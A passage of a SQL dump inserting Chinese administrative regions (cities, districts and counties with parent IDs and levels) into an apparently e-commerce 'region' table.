INSERT INTO `ec22703249_region` VALUES ('316', '24', '铜川', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('317', '24', '渭南', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('318', '24', '咸阳', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('319', '24', '延安', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('320', '24', '榆林', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('321', '25', '上海', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('322', '26', '成都', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('323', '26', '绵阳', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('324', '26', '阿坝', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('325', '26', '巴中', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('326', '26', '达州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('327', '26', '德阳', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('328', '26', '甘孜', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('329', '26', '广安', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('330', '26', '广元', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('331', '26', '乐山', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('332', '26', '凉山', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('333', '26', '眉山', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('334', '26', '南充', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('335', '26', '内江', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('336', '26', '攀枝花', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('337', '26', '遂宁', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('338', '26', '雅安', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('339', '26', '宜宾', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('340', '26', '资阳', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('341', '26', '自贡', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('342', '26', '泸州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('343', '27', '天津', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('344', '28', '拉萨', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('345', '28', '阿里', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('346', '28', '昌都', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('347', '28', '林芝', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('348', '28', '那曲', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('349', '28', '日喀则', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('350', '28', '山南', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('351', '29', '乌鲁木齐', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('352', '29', '阿克苏', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('353', '29', '阿拉尔', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('354', '29', '巴音郭楞', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('355', '29', '博尔塔拉', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('356', '29', '昌吉', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('357', '29', '哈密', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('358', '29', '和田', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('359', '29', '喀什', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('360', '29', '克拉玛依', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('361', '29', '克孜勒苏', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('362', '29', '石河子', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('363', '29', '图木舒克', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('364', '29', '吐鲁番', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('365', '29', '五家渠', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('366', '29', '伊犁', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('367', '30', '昆明', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('368', '30', '怒江', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('369', '30', '普洱', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('370', '30', '丽江', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('371', '30', '保山', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('372', '30', '楚雄', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('373', '30', '大理', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('374', '30', '德宏', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('375', '30', '迪庆', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('376', '30', '红河', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('377', '30', '临沧', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('378', '30', '曲靖', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('379', '30', '文山', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('380', '30', '西双版纳', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('381', '30', '玉溪', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('382', '30', '昭通', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('383', '31', '杭州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('384', '31', '湖州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('385', '31', '嘉兴', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('386', '31', '金华', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('387', '31', '丽水', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('388', '31', '宁波', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('389', '31', '绍兴', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('390', '31', '台州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('391', '31', '温州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('392', '31', '舟山', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('393', '31', '衢州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('394', '32', '重庆', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('395', '33', '香港', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('396', '34', '澳门', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('397', '35', '台湾', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('398', '36', '迎江区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('399', '36', '大观区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('400', '36', '宜秀区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('401', '36', '桐城市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('402', '36', '怀宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('403', '36', '枞阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('404', '36', '潜山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('405', '36', '太湖县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('406', '36', '宿松县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('407', '36', '望江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('408', '36', '岳西县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('409', '37', '中市区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('410', '37', '东市区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('411', '37', '西市区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('412', '37', '郊区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('413', '37', '怀远县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('414', '37', '五河县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('415', '37', '固镇县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('416', '38', '居巢区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('417', '38', '庐江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('418', '38', '无为县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('419', '38', '含山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('420', '38', '和县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('421', '39', '贵池区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('422', '39', '东至县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('423', '39', '石台县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('424', '39', '青阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('425', '40', '琅琊区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('426', '40', '南谯区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('427', '40', '天长市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('428', '40', '明光市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('429', '40', '来安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('430', '40', '全椒县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('431', '40', '定远县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('432', '40', '凤阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('433', '41', '蚌山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('434', '41', '龙子湖区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('435', '41', '禹会区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('436', '41', '淮上区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('437', '41', '颍州区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('438', '41', '颍东区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('439', '41', '颍泉区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('440', '41', '界首市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('441', '41', '临泉县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('442', '41', '太和县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('443', '41', '阜南县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('444', '41', '颖上县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('445', '42', '相山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('446', '42', '杜集区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('447', '42', '烈山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('448', '42', '濉溪县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('449', '43', '田家庵区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('450', '43', '大通区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('451', '43', '谢家集区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('452', '43', '八公山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('453', '43', '潘集区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('454', '43', '凤台县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('455', '44', '屯溪区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('456', '44', '黄山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('457', '44', '徽州区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('458', '44', '歙县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('459', '44', '休宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('460', '44', '黟县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('461', '44', '祁门县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('462', '45', '金安区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('463', '45', '裕安区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('464', '45', '寿县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('465', '45', '霍邱县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('466', '45', '舒城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('467', '45', '金寨县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('468', '45', '霍山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('469', '46', '雨山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('470', '46', '花山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('471', '46', '金家庄区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('472', '46', '当涂县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('473', '47', '埇桥区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('474', '47', '砀山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('475', '47', '萧县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('476', '47', '灵璧县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('477', '47', '泗县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('478', '48', '铜官山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('479', '48', '狮子山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('480', '48', '郊区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('481', '48', '铜陵县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('482', '49', '镜湖区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('483', '49', '弋江区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('484', '49', '鸠江区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('485', '49', '三山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('486', '49', '芜湖县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('487', '49', '繁昌县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('488', '49', '南陵县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('489', '50', '宣州区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('490', '50', '宁国市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('491', '50', '郎溪县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('492', '50', '广德县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('493', '50', '泾县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('494', '50', '绩溪县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('495', '50', '旌德县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('496', '51', '涡阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('497', '51', '蒙城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('498', '51', '利辛县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('499', '51', '谯城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('500', '52', '东城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('501', '52', '西城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('502', '52', '海淀区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('503', '52', '朝阳区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('504', '52', '崇文区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('505', '52', '宣武区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('506', '52', '丰台区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('507', '52', '石景山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('508', '52', '房山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('509', '52', '门头沟区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('510', '52', '通州区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('511', '52', '顺义区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('512', '52', '昌平区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('513', '52', '怀柔区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('514', '52', '平谷区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('515', '52', '大兴区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('516', '52', '密云县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('517', '52', '延庆县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('518', '53', '鼓楼区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('519', '53', '台江区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('520', '53', '仓山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('521', '53', '马尾区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('522', '53', '晋安区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('523', '53', '福清市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('524', '53', '长乐市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('525', '53', '闽侯县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('526', '53', '连江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('527', '53', '罗源县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('528', '53', '闽清县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('529', '53', '永泰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('530', '53', '平潭县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('531', '54', '新罗区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('532', '54', '漳平市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('533', '54', '长汀县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('534', '54', '永定县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('535', '54', '上杭县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('536', '54', '武平县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('537', '54', '连城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('538', '55', '延平区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('539', '55', '邵武市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('540', '55', '武夷山市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('541', '55', '建瓯市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('542', '55', '建阳市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('543', '55', '顺昌县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('544', '55', '浦城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('545', '55', '光泽县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('546', '55', '松溪县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('547', '55', '政和县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('548', '56', '蕉城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('549', '56', '福安市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('550', '56', '福鼎市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('551', '56', '霞浦县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('552', '56', '古田县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('553', '56', '屏南县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('554', '56', '寿宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('555', '56', '周宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('556', '56', '柘荣县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('557', '57', '城厢区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('558', '57', '涵江区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('559', '57', '荔城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('560', '57', '秀屿区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('561', '57', '仙游县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('562', '58', '鲤城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('563', '58', '丰泽区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('564', '58', '洛江区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('565', '58', '清濛开发区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('566', '58', '泉港区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('567', '58', '石狮市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('568', '58', '晋江市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('569', '58', '南安市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('570', '58', '惠安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('571', '58', '安溪县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('572', '58', '永春县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('573', '58', '德化县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('574', '58', '金门县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('575', '59', '梅列区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('576', '59', '三元区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('577', '59', '永安市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('578', '59', '明溪县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('579', '59', '清流县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('580', '59', '宁化县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('581', '59', '大田县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('582', '59', '尤溪县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('583', '59', '沙县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('584', '59', '将乐县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('585', '59', '泰宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('586', '59', '建宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('587', '60', '思明区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('588', '60', '海沧区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('589', '60', '湖里区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('590', '60', '集美区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('591', '60', '同安区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('592', '60', '翔安区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('593', '61', '芗城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('594', '61', '龙文区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('595', '61', '龙海市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('596', '61', '云霄县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('597', '61', '漳浦县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('598', '61', '诏安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('599', '61', '长泰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('600', '61', '东山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('601', '61', '南靖县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('602', '61', '平和县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('603', '61', '华安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('604', '62', '皋兰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('605', '62', '城关区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('606', '62', '七里河区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('607', '62', '西固区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('608', '62', '安宁区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('609', '62', '红古区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('610', '62', '永登县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('611', '62', '榆中县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('612', '63', '白银区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('613', '63', '平川区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('614', '63', '会宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('615', '63', '景泰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('616', '63', '靖远县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('617', '64', '临洮县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('618', '64', '陇西县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('619', '64', '通渭县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('620', '64', '渭源县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('621', '64', '漳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('622', '64', '岷县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('623', '64', '安定区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('624', '64', '安定区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('625', '65', '合作市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('626', '65', '临潭县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('627', '65', '卓尼县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('628', '65', '舟曲县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('629', '65', '迭部县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('630', '65', '玛曲县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('631', '65', '碌曲县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('632', '65', '夏河县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('633', '66', '嘉峪关市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('634', '67', '金川区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('635', '67', '永昌县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('636', '68', '肃州区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('637', '68', '玉门市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('638', '68', '敦煌市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('639', '68', '金塔县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('640', '68', '瓜州县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('641', '68', '肃北', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('642', '68', '阿克塞', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('643', '69', '临夏市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('644', '69', '临夏县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('645', '69', '康乐县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('646', '69', '永靖县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('647', '69', '广河县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('648', '69', '和政县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('649', '69', '东乡族自治县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('650', '69', '积石山', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('651', '70', '成县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('652', '70', '徽县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('653', '70', '康县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('654', '70', '礼县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('655', '70', '两当县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('656', '70', '文县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('657', '70', '西和县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('658', '70', '宕昌县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('659', '70', '武都区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('660', '71', '崇信县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('661', '71', '华亭县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('662', '71', '静宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('663', '71', '灵台县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('664', '71', '崆峒区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('665', '71', '庄浪县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('666', '71', '泾川县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('667', '72', '合水县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('668', '72', '华池县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('669', '72', '环县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('670', '72', '宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('671', '72', '庆城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('672', '72', '西峰区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('673', '72', '镇原县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('674', '72', '正宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('675', '73', '甘谷县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('676', '73', '秦安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('677', '73', '清水县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('678', '73', '秦州区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('679', '73', '麦积区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('680', '73', '武山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('681', '73', '张家川', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('682', '74', '古浪县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('683', '74', '民勤县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('684', '74', '天祝', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('685', '74', '凉州区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('686', '75', '高台县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('687', '75', '临泽县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('688', '75', '民乐县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('689', '75', '山丹县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('690', '75', '肃南', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('691', '75', '甘州区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('692', '76', '从化市', '3', '0');
